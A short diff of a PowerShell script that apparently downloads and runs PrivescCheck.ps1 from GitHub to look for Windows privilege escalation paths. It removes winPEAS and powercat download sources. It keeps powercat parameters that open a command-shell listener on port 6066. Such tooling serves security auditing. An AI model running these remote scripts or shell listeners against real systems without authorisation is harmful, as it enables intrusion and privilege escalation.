@@ -7,9 +7,7 @@ Write-Output "  Downloads and use PrivescCheck.ps1 to check Privileges escalatio
 Write-Output "=========================================================================================="
 ################ [ List of commpiled programs to downlad ] ################
 $Ps1ScriptToUse = @("PrivescCheck.ps1")
-https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1
-$DownLoadSource = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
-$ExecuteFrom = "https://raw.githubusercontent.com/besimorhino/powercat/master"
+$ExecuteFrom = "https://github.com/itm4n/PrivescCheck/releases/latest/download"
 $PwCatParameters = " -l -p 6066 -e cmd -ge"
 ################ [ GLOBAL VARIABLES ] ################
 $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
